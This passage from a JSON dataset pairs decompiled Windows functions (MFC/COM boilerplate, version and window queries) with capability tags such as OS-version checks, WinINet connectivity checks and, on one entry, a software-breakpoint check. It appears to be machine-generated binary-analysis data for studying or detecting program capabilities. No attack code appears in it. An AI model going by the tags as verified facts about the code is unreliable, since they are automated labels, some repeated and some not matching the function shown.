        "decompiled_code": "\nvoid __fastcall fcn.0041c0a6(code **param_1)\n\n{\n    *param_1 = vtable.exception.0;\n    if (param_1[2] != NULL) {\n        fcn.0041ba6d(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "0042f45d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042f45d(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 4) == 0) {\n        return 0;\n    }\n    uVar1 = fcn.0042f433();\n    uVar1 = (*_sym.imp.GDI32.dll_DeleteObject)(uVar1);\n    return uVar1;\n}\n",
        "token_count": 89
    },
    "00411b70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.00411b70(int32_t param_1, int32_t param_2)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    \n    if (param_2 == 0) {\n        puVar1 = param_1 + 0x12;\n    }\n    else {\n        puVar1 = param_1 + 0x18;\n    }\n    if (*puVar1 == 0xffff) {\n        puVar1 = puVar1 + 2;\n    }\n    else {\n        do {\n            uVar2 = *puVar1;\n            puVar1 = puVar1 + 1;\n        } while (uVar2 != 0);\n    }\n    if (*puVar1 == 0xffff) {\n        puVar1 = puVar1 + 2;\n    }\n    else {\n        do {\n            uVar2 = *puVar1;\n            puVar1 = puVar1 + 1;\n        } while (uVar2 != 0);\n    }\n    uVar2 = *puVar1;\n    if ((uVar2 != 0) && (param_2 == 0)) {\n        uVar2 = uVar2 - 2;\n    }\n    return puVar1 + uVar2 + 5 & 0xfffffffc;\n}\n",
        "token_count": 287
    },
    "00412047": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412047(int32_t arg_8h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    \n    iVar3 = arg_8h;\n    if (*(arg_8h + 0x48) != 0) {\n        arg_8h = *(*(arg_8h + 0x48) + 0x40);\n        while (arg_8h != 0) {\n            piVar4 = fcn.00411acd(&arg_8h);\n            iVar2 = *piVar4;\n            if (*(iVar2 + 4) != 0) {\n                iVar5 = *(*(iVar2 + 4) + 0x90);\n                while (iVar5 != 0) {\n                    fcn.00415ee5(*(iVar2 + 4));\n                    if (*(iVar5 + 4) != 0) {\n                        iVar5 = fcn.0042cda5(*(iVar5 + 4));\n                        fcn.00417870(*(iVar5 + 0x4c));\n                    }\n                    iVar5 = fcn.00415eee();\n                }\n                iVar1 = *(*(iVar2 + 4) + 0x94);\n                if (iVar1 != 0) {\n                    iVar5 = fcn.0042cda5(iVar1);\n                    (**(**(iVar5 + 0x4c) + 0xb4))();\n                    *(*(iVar2 + 4) + 0x94) = *(iVar5 + 0x4c);\n                    (**(**(*(iVar5 + 0x4c) + 0x8c) + 8))(*(iVar2 + 4), 1);\n                }\n            }\n        }\n        arg_8h = *(*(iVar3 + 0x48) + 0x40);\n        while (arg_8h != 0) {\n            piVar4 = fcn.00411acd(&arg_8h);\n            iVar3 = *(*piVar4 + 4);\n            if ((iVar3 != 0) && (*(iVar3 + 0x8c) != 0)) {\n                (**(**(iVar3 + 0x8c) + 0xc))();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 515
    },
    "0041260e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041260e(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint lpVersionInformation;\n    uint var_94h;\n    uint var_88h;\n    uint var_4h;\n    \n    var_4h = *0x444220;\n    puVar2 = &var_94h;\n    for (iVar1 = 0x24; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 170
    },
    "004128a1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.004128a1(int32_t *arg_8h, int32_t arg_ch, uint noname_2, uint noname_3, uint32_t arg_18h, uint32_t *arg_1ch, \n            uint *arg_20h, uint noname_7, int32_t *arg_28h)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint16_t *puVar4;\n    code *pcVar5;\n    int32_t *piVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t *piVar11;\n    uint var_48h;\n    uint *var_44h;\n    uint *var_40h;\n    uint *var_34h;\n    uint var_30h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puVar7 = arg_1ch;\n    piVar6 = arg_8h;\n    iVar10 = 0;\n    var_30h._0_2_ = 0;\n    if (arg_8h == NULL) {\n        return -0x7ff8ffa9;\n    }\n    if (arg_1ch == NULL) {\n        return -0x7ffdfff8;\n    }\n    uVar2 = arg_1ch[2];\n    if (5 < uVar2) {\n        return -0x7ffdfff2;\n    }\n    arg_8h = NULL;\n    if (arg_1ch[3] != 0) {\n        arg_1ch = arg_1ch[1];\n        do {\n            uVar3 = *arg_1ch;\n            if (uVar2 <= uVar3) {\n                return -0x7ffdfff2;\n            }\n            arg_1ch = arg_1ch + 1;\n            arg_8h = arg_8h + 1;\n            (&var_44h)[uVar3] = *puVar7 + iVar10;\n            iVar10 = iVar10 + 0x10;\n        } while (arg_8h < puVar7[3]);\n    }\n    if (arg_8h < uVar2) {\n        iVar10 = arg_8h * 0x10 + *puVar7;\n        iVar9 = uVar2 - arg_8h;\n        piVar11 = &var_48h + (uVar2 - arg_8h);\n        do {\n            *piVar11 = iVar10;\n            iVar10 = iVar10 + 0x10;\n            piVar11 = piVar11 + -1;\n            iVar9 = iVar9 + -1;\n        } while (iVar9 != 0);\n    }\n    iVar10 = -0x7ffdfffd;\n    if (arg_28h == NULL) {\n        arg_28h = &arg_18h;\n    }\n    if (arg_20h == NULL) {\n        arg_20h = &var_30h;\n    }\n    (*_sym.imp.OLEAUT32.dll_VariantClear)(&var_10h);\n    pcVar5 = _sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime;\n    if (0x12 < arg_ch + 0x139aU) goto code_r0x00412e29;\n    // switch table (19 cases) at 0x412e3c\n    switch(*((arg_ch + 0x139aU) * 4 + 0x412e3c)) {\n    case 0x412986:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 100))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3]);\n            goto code_r0x00412e29;\n        }\n        break;\n    case 0x4129af:\n        if (puVar7[2] == 2) {\n            if (*var_44h != 3) {\n                iVar10 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&var_10h, var_44h, 0, 3);\n                if (iVar10 < 0) goto code_r0x004129d5;\n                var_44h = &var_10h;\n            }\n            arg_18h = var_44h[2];\n            if (*var_40h != 3) {\n                iVar10 = (*pcVar5)(&var_10h, var_40h, 0, 3);\n                if (iVar10 < 0) {\ncode_r0x00412a03:\n                    *arg_28h = 1;\n                    goto code_r0x00412e29;\n                }\n                var_40h = &var_10h;\n            }\n            iVar10 = (**(*piVar6 + 0x60))(piVar6, arg_18h, var_40h[2], arg_20h);\n            goto code_r0x00412e29;\n        }\n        break;\n    case 0x412a26:\n        if (puVar7[2] == 2) {\n            if (*var_44h != 3) {\n                iVar10 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&var_10h, var_44h, 0, 3);\n                if (iVar10 < 0) goto code_r0x004129d5;\n                var_44h = &var_10h;\n            }\n            iVar10 = (**(*piVar6 + 0x5c))(piVar6, var_44h[2], *var_40h, var_40h[1], var_40h[2], var_40h[3], arg_20h);\n            goto code_r0x00412e29;\n        }\n        break;\n    case 0x412a6f:\n        if (puVar7[2] == 5) {\n            iVar10 = 0;\n            do {\n                puVar4 = (&var_44h)[iVar10];\n                uVar1 = *puVar4;\n                if (((uVar1 & 0x4000) == 0) || ((uVar1 & 0xf) == 0)) {\n                    *arg_28h = iVar10;\n                    break;\n                }\n                if ((uVar1 & 0xc) == 0) {\n                    iVar9 = *(puVar4 + 4);\n                }\n                else {\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(*(puVar4 + 4));\n                    puVar4 = (&var_44h)[iVar10];\n                    **(puVar4 + 4) = 3;\n                    iVar9 = *(puVar4 + 4) + 8;\n                }\n                (&var_20h)[iVar10] = iVar9;\n                iVar10 = iVar10 + 1;\n            } while (iVar10 < 4);\n            iVar10 = (**(*piVar6 + 0x58))\n                               (piVar6, var_20h, var_1ch, var_18h, var_14h, *var_34h, var_34h[1], var_34h[2], var_34h[3]\n                               );\n            goto code_r0x00412e29;\n        }\n        break;\n    case 0x412ae5:\n        if (puVar7[2] == 2) {\n            if (*var_44h != 3) {\n                iVar10 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&var_10h, var_44h, 0, 3);\n                if (iVar10 < 0) goto code_r0x004129d5;\n                var_44h = &var_10h;\n            }\n            iVar10 = (**(*piVar6 + 0x54))(piVar6, var_44h[2], *var_40h, var_40h[1], var_40h[2], var_40h[3]);\n            goto code_r0x00412e29;\n        }\n        break;\n    case 0x412b2f:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x50))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\ncode_r0x00412b52:\n            if (-1 < iVar10) {\n                *arg_20h = 8;\n            }\n            goto code_r0x00412e29;\n        }\n        break;\n    case 0x412b69:\n        iVar10 = (**(*piVar6 + 0x4c))(piVar6, arg_20h);\n        goto code_r0x00412e29;\n    case 0x412b77:\n        iVar10 = (**(*piVar6 + 0x48))(piVar6, arg_20h);\n        goto code_r0x00412e29;\n    case 0x412b85:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x44))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x00412b52;\n        }\n        break;\n    case 0x412baa:\n        if (puVar7[2] == 2) {\n            uVar1 = *var_44h;\n            if (((uVar1 & 0x4000) != 0) && ((uVar1 & 0xc) == 0)) {\n                iVar10 = -0x7ffdfffb;\ncode_r0x004129d5:\n                *arg_28h = 0;\n                goto code_r0x00412e29;\n            }\n            if (uVar1 == 0x400c) {\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(var_44h[2]);\n                *var_44h[2] = 8;\n                puVar8 = var_44h[2] + 8;\n            }\n            else if (uVar1 == 0x4008) {\n                puVar8 = var_44h[2];\n            }\n            else {\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(var_44h);\n                puVar8 = var_44h + 2;\n                *var_44h = 8;\n            }\n            iVar10 = (**(*piVar6 + 0x40))(piVar6, puVar8, *var_40h, var_40h[1], var_40h[2], var_40h[3], arg_20h + 2);\n            goto code_r0x00412c20;\n        }\n        break;\n    case 0x412c37:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x3c))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x00412b52;\n        }\n        break;\n    case 0x412c5f:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x38))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h);\n            goto code_r0x00412e29;\n        }\n        break;\n    case 0x412c83:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x34))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h);\n            goto code_r0x00412e29;\n        }\n        break;\n    case 0x412ca7:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x30))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x00412b52;\n        }\n        break;\n    case 0x412ccf:\n        if ((arg_18h & 2) == 0) {\n            if ((arg_18h & 4) == 0) goto code_r0x00412d53;\n            if (puVar7[2] == 2) {\n                var_20h = *var_44h;\n                var_1ch = var_44h[1];\n                var_18h = var_44h[2];\n                var_14h = var_44h[3];\n                if (*var_40h != 8) {\n                    iVar10 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&var_10h, var_40h, 0, 3);\n                    if (iVar10 < 0) goto code_r0x00412a03;\n                    var_40h = &var_10h;\n                }\n                iVar10 = (**(*piVar6 + 0x6c))(piVar6, var_20h, var_1ch, var_18h, var_14h, var_40h[2]);\n                goto code_r0x00412e29;\n            }\n        }\n        else if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x2c))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x00412b52;\n        }\n        break;\n    case 0x412d53:\ncode_r0x00412d53:\n        if ((arg_18h & 2) == 0) {\n            if ((arg_18h & 4) == 0) goto code_r0x00412dd7;\n            if (puVar7[2] == 2) {\n                var_20h = *var_44h;\n                var_1ch = var_44h[1];\n                var_18h = var_44h[2];\n                var_14h = var_44h[3];\n                if (*var_40h != 8) {\n                    iVar10 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&var_10h, var_40h, 0, 3);\n                    if (iVar10 < 0) goto code_r0x00412a03;\n                    var_40h = &var_10h;\n                }\n                iVar10 = (**(*piVar6 + 0x68))(piVar6, var_20h, var_1ch, var_18h, var_14h, var_40h[2]);\n                goto code_r0x00412e29;\n            }\n        }\n        else if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x28))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x00412b52;\n        }\n        break;\n    case 0x412dd7:\ncode_r0x00412dd7:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x24))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x00412e1b;\n        }\n        break;\n    case 0x412dfc:\n        iVar10 = (**(*piVar6 + 0x20))(piVar6, arg_20h + 2);\ncode_r0x00412c20:\n        if (-1 < iVar10) {\n            *arg_20h = 3;\n        }\n        goto code_r0x00412e29;\n    case 0x412e0e:\n        iVar10 = (**(*piVar6 + 0x1c))(piVar6, arg_20h + 2);\ncode_r0x00412e1b:\n        if (-1 < iVar10) {\n            *arg_20h = 9;\n        }\n        goto code_r0x00412e29;\n    }\n    iVar10 = -0x7ffdfff2;\ncode_r0x00412e29:\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_10h);\n    return iVar10;\n}\n",
        "token_count": 3872
    },
    "00412e88": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00412e88(uint noname_0, int32_t arg_ch, uint32_t arg_10h, uint noname_3, int32_t arg_18h)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_1h;\n    \n    uVar3 = 0;\n    if (arg_10h != 0) {\n        do {\n            bVar1 = false;\n            uVar4 = 0;\n            do {\n                iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(*(arg_ch + uVar3 * 4), *(uVar4 + 0x443630));\n                if (iVar2 == 0) {\n                    bVar1 = true;\n                    *(arg_18h + uVar3 * 4) = *(uVar4 + 0x4435e0);\n                }\n                uVar4 = uVar4 + 4;\n            } while (uVar4 < 0x4c);\n            if (!bVar1) {\n                return 0x80020006;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < arg_10h);\n    }\n    return 0;\n}\n",
        "token_count": 303
    },
    "00412f10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00412f10(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0xc) == 0) {\n        return 0;\n    }\n    uVar1 = (**(**(param_1 + 0xc) + 0xc))(*(param_1 + 0xc), 0);\n    return uVar1;\n}\n",
        "token_count": 89
    },
    "00412f25": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00412f25(int32_t arg_8h, int32_t **arg_ch, int32_t *arg_10h, int32_t **arg_14h)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    \n    if ((arg_8h == 0) || (arg_ch == NULL)) {\n        iVar3 = -0x7ff8ffa9;\n    }\n    else if (arg_14h == NULL) {\n        iVar3 = -0x7fffbffd;\n    }\n    else {\n        *arg_14h = NULL;\n        if ((((*arg_10h == 0) && (arg_10h[1] == 0)) && (arg_10h[2] == 0xc0)) && (arg_10h[3] == 0x46000000)) {\ncode_r0x00412fd5:\n            piVar4 = arg_ch[1] + arg_8h;\n            (**(*piVar4 + 4))(piVar4);\n            *arg_14h = piVar4;\n            iVar3 = 0;\n        }\n        else {\n            piVar4 = arg_ch[2];\n            while (piVar4 != NULL) {\n                piVar2 = *arg_ch;\n                if ((piVar2 == NULL) ||\n                   (((*piVar2 == *arg_10h && (piVar2[1] == arg_10h[1])) &&\n                    ((piVar2[2] == arg_10h[2] && (piVar2[3] == arg_10h[3])))))) {\n                    if (piVar4 == 0x1) goto code_r0x00412fd5;\n                    iVar3 = (*piVar4)(arg_8h, arg_10h, arg_14h, arg_ch[1]);\n                    if (iVar3 == 0) {\n                        return 0;\n                    }\n                    if ((piVar2 != NULL) && (iVar3 < 0)) {\n                        return iVar3;\n                    }\n                }\n                ppiVar1 = arg_ch + 5;\n                arg_ch = arg_ch + 3;\n                piVar4 = *ppiVar1;\n            }\n            iVar3 = -0x7fffbffe;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 527
    },
    "00413d3a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_14h\n\nbool fcn.00413d3a(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    piVar3 = extraout_ECX + 0x12;\n    iVar1 = *piVar3;\n    *(unaff_EBP + -0x10) = &var_14h;\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    if (((iVar1 == 0) && (iVar1 = (**(*extraout_ECX + 0x124))(piVar3),  iVar1 != 0)) && (*piVar3 == 0)) {\n        *(unaff_EBP + -4) = 0;\n        iVar1 = fcn.00431a51();\n        iVar1 = (**(**(iVar1 + 0x1038) + 8))(extraout_ECX);\n        *piVar3 = iVar1;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    piVar3 = extraout_ECX;\n    if (extraout_ECX[0x12] != 0) {\n        while ((piVar3[0xe] & 0x100U) == 0) {\n            piVar3[0xe] = piVar3[0xe] | 0x100;\n            uVar2 = (*_sym.imp.USER32.dll_GetParent)(piVar3[7]);\n            piVar3 = fcn.0042aeb1(uVar2);\n            piVar4 = piVar3;\n            if (piVar3 != NULL) {\n                piVar4 = piVar3[7];\n            }\n            uVar5 = (*_sym.imp.USER32.dll_GetWindowLongA)(piVar4, 0xfffffff0);\n            if (((uVar5 & 0x40000000) == 0) || (piVar3 == NULL)) break;\n        }\n    }\n    iVar1 = extraout_ECX[0x12];\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar1 != 0;\n}\n",
        "token_count": 568
    },
    "00413df5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.00413df5(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    *extraout_ECX = vtable.COleControlContainer.0;\n    pcVar1 = extraout_ECX[0x10];\n    *(unaff_EBP + -4) = 2;\n    *(unaff_EBP + -0x10) = pcVar1;\n    while (pcVar1 != NULL) {\n        *(unaff_EBP + -0x14) = pcVar1;\n        piVar3 = fcn.00411acd();\n        iVar4 = *piVar3;\n        iVar2 = *(iVar4 + 4);\n        if ((iVar2 != 0) && (*(iVar2 + 0x8c) == 0)) {\n            fcn.00427b01();\n            fcn.004139d1();\n            fcn.00428fdc(iVar4);\n        }\n        pcVar1 = *(unaff_EBP + -0x10);\n    }\n    pcVar1 = extraout_ECX[0x12];\n    while (pcVar1 != NULL) {\n        iVar4 = fcn.00427add();\n        if (iVar4 != 0) {\n            fcn.004139d1();\n            fcn.00428fdc(iVar4);\n        }\n        pcVar1 = extraout_ECX[0x12];\n    }\n    fcn.00427ee8();\n    fcn.00433288(extraout_ECX + 0x18);\n    *(unaff_EBP + -4) = 1;\n    fcn.00427b83();\n    *(unaff_EBP + -4) = 0;\n    fcn.00428086();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00428b21();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 582
    },
    "00414208": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414208(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t in_ECX;\n    int32_t var_4h;\n    \n    var_4h = *(in_ECX + 0x40);\n    while (var_4h != 0) {\n        piVar1 = fcn.00411acd(&var_4h);\n        if (*(*piVar1 + 4) != 0) {\n            fcn.004153c6(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 126
    },
    "00414bbf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00414bbf(int32_t param_1, uint32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t in_EAX;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    \n    if (*(param_1 + 0x1c) == '\\0') {\n        iVar1 = *(*(param_1 + 0x14) + 8);\n        in_EAX = *param_2;\n        if (in_EAX <= *(param_1 + 0xc) + -1 + iVar1) {\n            in_EAX = in_EAX - iVar1;\n            *param_2 = in_EAX;\ncode_r0x00414c0b:\n            return CONCAT31(in_EAX >> 8, 1);\n        }\n    }\n    else {\n        uVar3 = 0;\n        if (*(param_1 + 0xc) != 0) {\n            in_EAX = *param_2;\n            puVar2 = *(param_1 + 0x14) + 8;\n            do {\n                if (*puVar2 == in_EAX) {\n                    *param_2 = uVar3;\n                    goto code_r0x00414c0b;\n                }\n                uVar3 = uVar3 + 1;\n                puVar2 = puVar2 + 0xc;\n            } while (uVar3 < *(param_1 + 0xc));\n        }\n    }\n    return in_EAX & 0xffffff00;\n}\n",
        "token_count": 337
    },
    "00415050": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00415050(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    if ((*(in_ECX + 0x4c) != 0) && (iVar1 = (****(in_ECX + 0x4c))(*(in_ECX + 0x4c), 0x43c1ec, &var_8h),  -1 < iVar1)) {\n        var_4h = NULL;\n        var_ch = 0;\n        iVar1 = (**(*var_8h + 0x10))(var_8h, arg_8h, &var_4h);\n        if (-1 < iVar1) {\n            (**(*var_4h + 0x14))(var_4h, arg_ch, &var_ch);\n            (**(*var_4h + 8))(var_4h);\n        }\n        (**(*var_8h + 8))(var_8h);\n        return var_ch;\n    }\n    return 0;\n}\n",
        "token_count": 259
    },
    "004150ba": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004150ba(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    if ((arg_ch != 0) && (in_ECX[0x13] != 0)) {\n        var_8h = in_ECX;\n        iVar1 = (***in_ECX[0x13])(in_ECX[0x13], 0x43c1ec, &var_8h);\n        if (-1 < iVar1) {\n            var_4h = NULL;\n            iVar1 = (**(*var_8h + 0x10))(var_8h, arg_8h, &var_4h);\n            if (-1 < iVar1) {\n                (**(*var_4h + 0x18))(var_4h, arg_ch);\n                (**(*var_4h + 8))(var_4h);\n            }\n            (**(*var_8h + 8))(var_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 251
    },
    "0041511a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
